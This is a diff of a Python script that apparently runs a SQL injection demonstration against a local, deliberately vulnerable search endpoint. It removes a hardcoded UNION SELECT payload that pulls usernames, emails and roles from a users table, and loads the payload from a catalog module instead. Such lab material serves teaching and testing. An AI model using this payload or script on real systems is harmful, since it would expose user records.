@@ -7,18 +7,21 @@ appending rows from the users table to the product results.
 
 import requests
 
-SEARCH_URL = "http://127.0.0.1:5000/vulnerable/search"
+from catalog import load_attack
 
-PAYLOAD = "%' UNION SELECT id, username, email, role FROM users -- "
+SEARCH_URL = "http://127.0.0.1:5000/vulnerable/search"
 
 
 def main() -> None:
+    attack = load_attack(3)
+    payload = attack["payload"]
+
     print(f"Target: {SEARCH_URL}")
-    print(f"Payload: {PAYLOAD!r}")
+    print(f"Payload: {payload!r}")
     print()
 
     try:
-        response = requests.get(SEARCH_URL, params={"q": PAYLOAD}, timeout=5)
+        response = requests.get(SEARCH_URL, params={"q": payload}, timeout=5)
     except requests.RequestException as exc:
         print(f"[ERROR] Request failed: {exc}")
         return
